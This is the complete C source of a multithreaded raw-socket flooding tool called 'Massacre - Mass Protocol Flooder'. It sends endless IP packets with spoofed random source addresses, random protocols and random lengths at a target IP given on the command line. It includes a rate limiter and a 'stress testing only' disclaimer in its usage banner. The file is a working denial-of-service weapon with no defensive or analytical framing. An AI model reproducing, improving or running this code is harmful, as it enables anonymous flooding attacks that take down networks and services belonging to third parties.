#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 65534
#define PHI 0x9e3779b9


static unsigned long int Q[4096], c = 362436;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

void init_rand(unsigned long int x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}
unsigned long int rand_cmwc(void)
{
	unsigned long long int t, a = 18782LL;
	static unsigned long int i = 4095;
	unsigned long int x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c) {
		x++;
		c++;
	}
	return (Q[i] = r - x);
}
unsigned short csum (unsigned short *buf, int count)
{
	register unsigned long sum = 0;
	while( count > 1 ) { sum += *buf++; count -= 2; }
	if(count > 0) { sum += *(unsigned char *)buf; }
	while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
	return (unsigned short)(~sum);
}


void setup_ip_header(struct iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr);
	iph->id = rand();
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->check = 0;
	iph->saddr = inet_addr("192.168.3.100");
}



void *flood(void *par1)
{
	char *td = (char *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = rand();
	sin.sin_addr.s_addr = inet_addr(td);

	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if(s < 0){
		fprintf(stderr, "Cannot open sockets, are you root?\n");
		fprintf(stderr, "Exiting...\n");
		exit(-1);
	}
	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);


	iph->daddr = sin.sin_addr.s_addr;
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);

	int tmp = 1;
	const int *val = &tmp;
	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
		fprintf(stderr, "Error: Cannot rewrite the packet headers\n");
		fprintf(stderr, "Exiting...\n");
		exit(-1);
	}

	init_rand(time(NULL));
	register unsigned int i;
	i = 0;
	while(1){
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
		
		iph->protocol = rand() % (144 + 1 - 0) + 0;
		iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
		iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
		iph->tot_len = rand() % (1500 + 1 - 0) + 0;
		iph->check = csum ((unsigned short *) datagram, iph->tot_len);
		
		pps++;
		if(i >= limiter)
		{
			i = 0;
			usleep(sleeptime);
		}
		i++;
	}
}
int main(int argc, char *argv[ ])
{
	if(argc < 5){
		fprintf(stderr, "Massacre - Mass Protocol Flooder V.1\n");
		fprintf(stderr, "Made by JiiN - Private for Cyber-Hub.pw\n\n");
		fprintf(stderr, " ============================================================================\n");
		fprintf(stderr, " >> For network stress testing only! <<\n");
		fprintf(stderr, " >> Users are legally responsible for the illegal usage of this tool <<\n");
		fprintf(stderr, " ============================================================================\n");
		fprintf(stdout, "\nUsage: %s <target IP> <number threads to use> <pps limiter, -1 for no limit> <time>\n", argv[0]);
		exit(-1);
	}
	fprintf(stdout, "Setting up sockets...\n");

	int num_threads = atoi(argv[2]);
	int maxpps = atoi(argv[3]);
	int time = atoi(argv[4]);
	limiter = 0;
	pps = 0;
	pthread_t thread[num_threads];
	
	int multiplier = 100;

	int i;
	for(i = 0;i<num_threads;i++){
		pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
	}
	fprintf(stdout, "Sending packets...\n");
	fprintf(stdout, "Massacre started!\n");
	for(i = 0;i<(time*multiplier);i++)
	{
		usleep((1000/multiplier)*1000);
		if((pps*multiplier) > maxpps)
		{
			if(1 > limiter)
			{
				sleeptime+=100;
			} else {
				limiter--;
			}
		} else {
			limiter++;
			if(sleeptime > 25)
			{
				sleeptime-=25;
			} else {
				sleeptime = 0;
			}
		}
		pps = 0;
	}

	return 0;
}
